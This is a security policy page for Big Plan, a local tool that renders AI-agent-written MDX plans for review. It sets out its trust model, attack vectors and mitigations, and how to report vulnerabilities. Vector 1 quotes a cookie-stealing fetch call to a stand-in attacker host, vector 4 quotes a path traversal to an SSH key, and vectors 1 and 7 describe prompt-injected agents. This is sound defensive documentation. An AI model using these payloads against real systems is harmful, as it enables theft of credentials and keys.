---
title: Security
description: Big Plan's security posture - the trust model, the ways it could be attacked, what stops each one, and the limits it accepts rather than hides.
---

Fundamentally, Big Plan takes a document written by an AI agent, renders it into HTML, serves it
from a local web server, and lets that agent write to a file on your disk. Now let's dig in to the
security implications of that setup, and how we mitigate any threats.

## The trust model

Three assumptions decide everything else:

1. **Plan content is untrusted.** An agent wrote it. It may be wrong, and it may be adversarial —
   whether because the agent was prompt-injected by a repository it read, or because someone
   handed you a plan file. Plan text is data, never instructions and never code.
2. **Loopback is not an authentication boundary.** `127.0.0.1` sounds private and is not. Any web
   page your browser has open can send requests to it, and any process running as you can too.
   Every request is authorised on its own merits rather than trusted for arriving locally.
3. **An attacker already running code as you has won.** Big Plan is not a sandbox and does not
   claim to defend against that. Where a mitigation would be theatre against such an attacker, it
   is documented as an accepted limit instead of implemented.

There is no account or hosted service, and a rendered document makes no external requests. An
installed copy of the CLI makes exactly one kind of outbound request: after the command has printed
its output, a detached worker asks the npm registry only for the latest published version of the
`big-plan` package, so no command waits on the network. A successful check is cached for 24 hours,
and each registry request times out after two seconds. The check sends no plan content, file path,
or review data, and it is skipped entirely for the recommended `npx -y big-plan@latest` path.

## Threat vectors

### 1. A plan that carries code

**The attack.** Plans are MDX, and MDX is JavaScript-adjacent by design: it supports `import`,
expressions, and inline JSX. An agent that has been prompt-injected writes a plan containing
`{fetch('http://attacker/'+document.cookie)}` or an `onClick` handler. You open the document and
it runs as you.

**What stops it.** Plan-authored code never reaches the renderer. The compiler rejects it as a
diagnostic instead of evaluating it. Given a plan containing all three:

```text
$ big-plan validate bad.mdx
error: Cannot validate document with invalid MDX
code: VALIDATION_ERROR
help[3]: "5:1 ESM import/export statements are not supported",
         "7:1 Inline JSX is not supported; components must be flow-level",
         "9:1 Flow expressions are not supported"
```

A plan cannot introduce script into its own rendered document. What it _can_ do is choose from a
fixed library of components, whose markup Big Plan writes and the plan only fills with data.

An invalid document never renders partially. Validation collects every recoverable problem and
fails with the complete list, because a silently degraded document is worse than a failed one:
the whole product is trust in what you approved.

### 2. A web page that reaches your review runtime

**The attack.** `big-plan review` starts an HTTP server on loopback. While you read your plan in
one tab, any other tab can `fetch()` that server, or an attacker's DNS can resolve their hostname
to `127.0.0.1` and turn their page into a same-origin one (DNS rebinding). Either way they read
your plan, or post an approval you never gave.

**What stops it — four independent controls, because any one of them can be wrong:**

- **Bound explicitly to `127.0.0.1`** on an ephemeral port. Never `0.0.0.0`, never a hostname.
- **A per-session token**, 32 random bytes, injected into the one document the runtime serves and
  required on every API request. It travels in a header, so it stays out of browser history,
  referrers, and server logs, and it is compared with a constant-time equality check.
- **A `Host` header allow-list.** A request whose `Host` is not this runtime's or the local
  service's address is refused. That allow-list, not the socket address, is what actually defeats
  DNS rebinding — a rebound request arrives on `127.0.0.1` carrying the attacker's hostname.
- **No CORS allowance is ever sent**, and a foreign `Origin` or a `Sec-Fetch-Site` other than
  `same-origin` is refused outright. CORS hides a _response_; it does not stop a _write_, so it is
  not relied on as the control.

Three read-only GET requests deliberately skip the token: the document route, which renders the
authoritative MDX rather than serving arbitrary HTML; plan pictures, which accept only supported
picture types; and stored review images, addressed by a validated content digest.

### 3. A rendered document that phones home

**The attack.** You render a plan and send the HTML to a colleague. It quietly beacons who opened
it, when, and from where — or it pulls a script from a CDN that is later compromised.

**What stops it.** The document embeds its own styles, fonts, and branding and makes no external
requests at all. Opening one contacts no server, including ours. It stays fully readable with
JavaScript disabled, and Big Plan ships no separate script-free variant to keep that honest.

`big-plan review` always renders the document in process from the authoritative MDX and **never
serves a pre-existing `.html` file**, because arbitrary HTML is arbitrary script running on the
runtime's own origin.

### 4. Reading a file outside the plan directory

**The attack.** A plan references `![](../../../.ssh/id_rsa)`. The picture route obligingly opens
it and serves your private key to whatever can reach the runtime.

**What stops it.** The plan-picture route is not a static file server — there is no general
static route and no directory listing anywhere. It serves only supported picture types; the
requested path and the resolved real path must both stay inside the plan directory; neither may
contain a dot-prefixed segment; the opened file must match the path that was accepted, must be a
regular file, and must be within the size limit. Request bodies are capped at 1 MB, images at
their own limit.

### 5. Writing the plan behind your back

**The attack.** You approve what you read. Meanwhile the agent rewrites the plan file underneath
you, so the bytes on disk are not the bytes you approved — or two writers race and the file ends
up a mixture of both.

**What stops it.** The plan file has exactly one writer, and the agent is not it. Agent edits go
into a claim-scoped private stage. A stage publishes only under the plan-mutation lock, only
while the recorded lock holder, the claim generation, and the source's base digest all still
hold, and only through a single atomic rename — with a journal written beforehand so an
interrupted publish settles to exactly one answer after a crash rather than to a guess.

Your own writes cross the same boundary. Rejecting a change or reverting a response re-proves the
digest the restoration was computed against, which is why a revision the agent published while you
were deciding **refuses** the write rather than silently disappearing under it. Approval stamps your
answers into the source inside the approval commit's own hold of that lock, so it cannot go stale
against its own write.

### 6. The install path

**The attack.** You run `npx big-plan`. Something other than the release you meant to run
executes, with your privileges, in your project.

**What stops it, and what does not:**

- **Releases are published from CI only, with npm provenance**, using Trusted Publishing over
  OIDC rather than a long-lived token. The workflow refuses to publish unless the tag equals the
  package version and points at a commit on `main`, and it runs the full lint, build, drift,
  unit, and end-to-end suites first. Runtime dependencies are audited at high severity on every CI
  run.
- **An unversioned `npx` run is a real hazard, and this is the honest caveat**: `npx big-plan` may
  execute a matching version already installed in your project rather than fetch a release. Pin an
  exact version if your environment requires a fixed, reviewed one.

Verify a published tarball was built by that workflow from this repository:

```sh
version="${BIG_PLAN_VERSION:?Set BIG_PLAN_VERSION to the exact version to verify}"
audit_dir="$(mktemp -d)"
npm --prefix "$audit_dir" install "big-plan@$version"
npm --prefix "$audit_dir" audit signatures
```

`npm audit signatures` needs npm 9.5 or newer and verifies the whole installed graph in that
directory, so installing into an empty prefix first is what keeps its answer about the release you
meant to check.

The setup prompt on [Install Big Plan](/intro/installation/) points your agent at
`https://bigplan.dev/setup.md`. That is a document your agent reads, on a site we control; it is
not a script that is piped into a shell.

### 7. A confused or compromised agent

**The attack.** The agent connected to your review is prompt-injected by something it read, and
tries to use the review channel to do more than revise the plan.

**What stops it.** Reviewer text and plan text stay plain, untrusted data in the browser and in
the agent brief. Sending a feedback package grants exactly one thing: the authority to consider
those notes while revising the named plan source. The agent still cannot write the plan file
directly — every edit goes through the staged publication in vector 5 — and it cannot approve on
your behalf.

## Limits Big Plan accepts rather than hides

**A local attacker.** Anyone already running code as you can read your plans, drive your browser,
and write your files without involving Big Plan at all. The local runtime is explicitly not a
boundary against that, and issues that require it are out of scope.

**One filesystem race.** Node offers no file-open relative to an already-open directory handle, so
someone who can already write inside your plan directory can swap an ancestor directory between
the moment a path is validated and the moment it is opened, and make the picture route open a file
outside the plan directory. Closing that race is not possible with the available primitives, and
such an attacker already has the access the check would protect. It is documented rather than
papered over.

**Pre-1.0.** Only the latest published version receives security fixes. There are no backports;
the fix for a reported issue is to upgrade. See [what alpha means](/alpha/).

## Reporting a vulnerability

Report privately through GitHub, never in a public issue:

1. Open [the repository's security advisories
   page](https://github.com/josh-padnick/big-plan/security/advisories/new).
2. Describe what an attacker can do, the version you tested, and the smallest reproduction you
   have.
3. Include the platform and Node.js version if the issue depends on either.

Please do not open a public issue, pull request, or discussion for a suspected vulnerability, and
please do not publish a working exploit before a fix ships.

**In scope:** anything that lets a plan, a web page, or a remote party read or write your files,
reach the review runtime's API, or execute code through Big Plan. A defect in Node.js, npm, or a
dependency is in scope **when Big Plan's use of it gives you a way to exploit Big Plan** — report
it here and upstream too.

**Out of scope:** an upstream defect with no Big-Plan-specific path to exploit it, attacks that
require an attacker already executing code as you, and issues needing physical access.

Reports are answered on a best-effort basis: we acknowledge, then come back with a severity
judgement and either a fix plan or an explanation of why we do not consider it a vulnerability.
Fixes ship as soon as they are ready, and disclosure is coordinated with the reporter, who is
credited unless they ask otherwise.

This page is the canonical security policy. The repository's
[`SECURITY.md`](https://github.com/josh-padnick/big-plan/blob/main/SECURITY.md) points here rather
than repeating it.
